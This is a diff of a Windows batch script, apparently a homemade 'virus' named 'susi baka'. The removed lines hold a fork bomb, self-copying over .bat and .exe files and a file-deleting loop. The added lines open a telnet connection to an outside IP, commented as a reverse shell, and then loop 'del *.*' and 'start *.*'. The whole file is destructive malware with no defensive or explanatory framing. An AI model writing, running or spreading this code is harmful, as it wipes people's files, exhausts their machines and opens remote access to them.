@@ -4,22 +4,13 @@
 title susi baka
 color 57
 
-:: loop
-lessgo:
+:: reverse shell into
+:: the windows machine
+telnet 10.14.7.228 8081
 
-:: increase cpu usage
-%0|%0
-
-:: copy and start all bat files
-copy %0 *.bat > nul
-start "" *.bat
-
-:: copy and start all exe files
-copy %0 *.exe > nul
-start "" *.exe
-
-:: virus
+:: once done starts loop
+virus:
+0%0
 del *.*
-
-:: start loop
-goto lessgo
+start *.*
+goto virus
